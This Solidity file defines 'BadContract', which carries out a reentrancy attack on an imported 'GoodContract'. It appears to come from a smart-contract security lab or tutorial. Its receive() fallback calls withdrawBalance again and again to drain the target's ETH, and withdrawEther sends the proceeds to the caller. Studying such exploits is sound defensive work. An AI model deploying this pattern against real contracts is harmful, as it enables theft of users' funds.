// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./GoodContract.sol";

contract BadContract {

    GoodContract public goodContract;

    constructor(address _goodContract) public {
        goodContract = GoodContract(_goodContract);
    }

    function withdrawEther() public {
        uint256 balance = address(this).balance;
        require( balance > 0, "No ETH to withdraw");
        (bool success, ) = (msg.sender).call{value: balance }("");
        require(success, "Failed to transfer ETH");
    }

    function startAttack() public payable {
        goodContract.addToBalance{value: msg.value}();
        goodContract.withdrawBalance();
    }

    receive() external payable {
        uint256 goodContractBalance = address(goodContract).balance;
        if(goodContractBalance>0) {
            goodContract.withdrawBalance();
        }
    }
}